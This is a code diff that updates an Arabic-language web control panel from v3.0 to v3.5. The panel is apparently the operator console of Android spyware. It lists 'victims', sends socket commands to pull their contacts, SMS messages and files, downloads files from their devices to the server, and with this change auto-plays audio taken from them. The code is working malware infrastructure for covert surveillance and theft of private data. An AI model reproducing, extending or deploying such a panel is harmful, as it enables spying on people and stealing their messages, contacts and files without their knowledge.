@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Control Panel v3.0 | 2026</title>
+    <title>Control Panel v3.5 | Auto-Play Mode</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css">
     
@@ -20,20 +20,21 @@
         .table tr { border-bottom: 1px solid #334155; }
         .badge-online { background: #10b981; width: 10px; height: 10px; display: inline-block; border-radius: 50%; margin-left: 5px; }
 
-        /* Data Viewer General */
+        /* Data Viewer */
         #data-view { min-height: 500px; max-height: 700px; overflow-y: auto; background: #0f172a; border-radius: 8px; padding: 20px; }
 
-        /* Contacts UI */
+        /* Audio Player Style */
+        .audio-player-box { background: #075985; padding: 15px; border-radius: 10px; margin-bottom: 20px; border: 1px solid #38bdf8; }
+
+        /* SMS & Contacts */
         .contact-card { background: #2d3748; border-radius: 8px; padding: 12px; margin-bottom: 10px; display: flex; align-items: center; border-right: 4px solid var(--accent); }
         .contact-icon { width: 40px; height: 40px; background: #4a5568; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-left: 15px; font-weight: bold; }
-
-        /* SMS UI (Chat Bubbles) */
         .sms-container { display: flex; flex-direction: column; gap: 12px; }
         .sms-bubble { max-width: 85%; padding: 12px; border-radius: 15px; background: #2d3748; border: 1px solid #4a5568; align-self: flex-start; }
         .sms-sender { font-weight: bold; color: var(--accent); display: block; font-size: 13px; margin-bottom: 4px; }
         .company-msg { border-right: 4px solid #ef4444; }
 
-        /* File Manager UI */
+        /* File Manager */
         .file-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(110px, 1fr)); gap: 15px; }
         .file-item { text-align: center; cursor: pointer; padding: 10px; border-radius: 8px; transition: 0.2s; }
         .file-item:hover { background: #334155; }
@@ -42,28 +43,17 @@
         .file-color { color: #94a3b8; }
         .apk-color { color: #4ade80; }
 
-        /* Logs */
+        /* Utils */
         #log-window { background: #000; height: 150px; overflow-y: auto; font-family: monospace; font-size: 12px; color: #4ade80; padding: 10px; border-radius: 8px; }
-    .sms-body{
-        color: #fff;
-    }
-    .fw-bold{
-        color: #fff;
-    }
-    .text-muted{
-    color: rgb(181 184 187) !important;
-    }
-    .file-name{
-            color: #fff;
-
-    }
+        .sms-body, .fw-bold, .file-name { color: #fff; }
+        .text-muted { color: rgb(181 184 187) !important; }
     </style>
 </head>
 <body>
 
 <div class="main-header shadow-sm">
     <div class="container-fluid d-flex justify-content-between align-items-center">
-        <h4 class="m-0 text-info"><i class="bi bi-cpu"></i> لوحة التحكم المركزية <small class="text-muted" style="font-size: 10px;">v3.0</small></h4>
+        <h4 class="m-0 text-info"><i class="bi bi-cpu"></i> لوحة التحكم المركزية <small class="text-muted" style="font-size: 10px;">v3.5</small></h4>
         <div id="connection-status"><span class="badge-online"></span> السيرفر متصل</div>
     </div>
 </div>
@@ -82,8 +72,7 @@
                                 <th>الأوامر</th>
                             </tr>
                         </thead>
-                        <tbody id="victim-list">
-                            </tbody>
+                        <tbody id="victim-list"></tbody>
                     </table>
                 </div>
             </div>
@@ -95,6 +84,8 @@
         </div>
 
         <div class="col-lg-7">
+            <div id="audio-anchor"></div>
+
             <div class="card shadow">
                 <div class="card-header border-secondary bg-transparent d-flex justify-content-between align-items-center">
                     <h5 class="m-0" id="view-title">مستعرض البيانات</h5>
@@ -115,6 +106,7 @@
 <script>
     const socket = io();
     let currentTargetId = null;
+
     // 1. تحديث قائمة الضحايا
     socket.on('update_victims', (victims) => {
         const list = document.getElementById('victim-list');
@@ -146,80 +138,74 @@
         }
     });
 
-    socket.emit("upv","")
+    socket.emit("upv", "");
 
-    // 2. وظيفة إرسال الأوامر وتغيير الهدف
+    // 2. وظيفة إرسال الأوامر
     function setTarget(id, type, extra = '', path = '') {
         currentTargetId = id;
         document.getElementById('view-title').innerText = `طلب ${type} من الجهاز...`;
         document.getElementById('data-view').innerHTML = '<div class="text-center mt-5"><div class="spinner-border text-info"></div><p>جاري سحب البيانات...</p></div>';
         
-        // تحويل الاسم لنوع الطلب البرمجي (Files -> fileManager)
         let orderType = type === 'Files' ? 'fileManager' : type.toLowerCase();
         socket.emit('admin_command', { targetId: id, type: orderType, extra, path });
     }
 
-    // 3. استقبال البيانات وعرضها بشكل تفاعلي
+    // 3. استقبال البيانات
     socket.on('data_received', (data) => {
         const view = document.getElementById('data-view');
         const title = document.getElementById('view-title');
-        
         title.innerText = `عرض البيانات: ${data.type}`;
         view.innerHTML = '';
 
-        // عرض الأسماء
         if (data.type === 'Contacts' && data.content.contactsList) {
             let html = '<div class="row">';
             data.content.contactsList.forEach(item => {
-                html += `
-                    <div class="col-md-6">
-                        <div class="contact-card">
-                            <div class="contact-icon">${item.name ? item.name.charAt(0) : '?'}</div>
-                            <div>
-                                <div class="fw-bold">${item.name}</div>
-                                <small class="text-muted">${item.phoneNo}</small>
-                            </div>
-                        </div>
-                    </div>`;
+                html += `<div class="col-md-6"><div class="contact-card"><div class="contact-icon">${item.name ? item.name.charAt(0) : '?'}</div><div><div class="fw-bold">${item.name}</div><small class="text-muted">${item.phoneNo}</small></div></div></div>`;
             });
             view.innerHTML = html + '</div>';
         } 
-        
-        // عرض الرسائل
         else if (data.type === 'SMS' && data.content.smsList) {
             let html = '<div class="sms-container">';
             data.content.smsList.forEach(item => {
                 const isCompany = isNaN(item.phoneNo.replace('+', ''));
-                html += `
-                    <div class="sms-bubble ${isCompany ? 'company-msg' : ''}">
-                        <span class="sms-sender">${item.phoneNo}</span>
-                        <div class="sms-body">${item.msg.replace(/(https?:\/\/[^\s]+)/g, '<a href="$1" target="_blank" class="text-info">$1</a>')}</div>
-                    </div>`;
+                html += `<div class="sms-bubble ${isCompany ? 'company-msg' : ''}"><span class="sms-sender">${item.phoneNo}</span><div class="sms-body">${item.msg.replace(/(https?:\/\/[^\s]+)/g, '<a href="$1" target="_blank" class="text-info">$1</a>')}</div></div>`;
             });
             view.innerHTML = html + '</div>';
         }
-
-        // عرض الملفات
         else if (data.type === 'Files' && Array.isArray(data.content)) {
             let currentPath = data.content[0].path.substring(0, data.content[0].path.lastIndexOf('/')) || '/';
             document.getElementById('view-controls').innerHTML = `<span class="badge bg-dark">${currentPath}</span>`;
-            
             let html = '<div class="file-grid">';
             data.content.forEach(item => {
-                let icon = item.isDir ? 'bi-folder-fill dir-color' : (item.name.endsWith('.apk') ? 'bi-android2 apk-color' : 'bi-file-earmark-text file-color');
+                let icon = item.isDir ? 'bi-folder-fill dir-color' : (item.name.toLowerCase().endsWith('.mp3') ? 'bi-music-note-beaming text-primary' : (item.name.endsWith('.apk') ? 'bi-android2 apk-color' : 'bi-file-earmark-text file-color'));
                 let action = item.isDir ? `onclick="setTarget('${currentTargetId}', 'Files', 'ls', '${item.path}')"` : `onclick="dlFile('${item.path}')"`;
-                
-                html += `
-                    <div class="file-item" ${action}>
-                        <div class="file-icon"><i class="bi ${icon}"></i></div>
-                        <div class="file-name text-truncate" title="${item.name}">${item.name}</div>
-                    </div>`;
+                html += `<div class="file-item" ${action}><div class="file-icon"><i class="bi ${icon}"></i></div><div class="file-name text-truncate" title="${item.name}">${item.name}</div></div>`;
             });
             view.innerHTML = html + '</div>';
         }
     });
 
-    // 4. وظائف إضافية
+    // 4. ميزة تشغيل الصوت التلقائي بعد التحميل
+    socket.on('file_ready', (data) => {
+        if (data.isAudio) {
+            const anchor = document.getElementById('audio-anchor');
+            anchor.innerHTML = `
+                <div class="audio-player-box shadow animate__animated animate__fadeInDown">
+                    <div class="d-flex justify-content-between align-items-center mb-2">
+                        <span class="fw-bold"><i class="bi bi-play-circle-fill"></i> جاري التشغيل: ${data.name}</span>
+                        <button class="btn-close btn-close-white" onclick="this.parentElement.parentElement.remove()"></button>
+                    </div>
+                    <audio id="auto-player" controls autoplay src="${data.url}" style="width: 100%"></audio>
+                </div>`;
+            
+            const player = document.getElementById('auto-player');
+            player.play().catch(e => {
+                const log = document.getElementById('log-window');
+                log.innerHTML += `[${new Date().toLocaleTimeString()}] تنبيه: المتصفح منع التشغيل التلقائي. اضغط تشغيل يدوياً.<br>`;
+            });
+        }
+    });
+
     function dlFile(path) {
         if(confirm('هل تريد تحميل هذا الملف للسيرفر؟')) {
             socket.emit('admin_command', { targetId: currentTargetId, type: 'fileManager', extra: 'dl', path });
@@ -238,6 +224,5 @@
         log.scrollTop = log.scrollHeight;
     });
 </script>
-
 </body>
 </html>
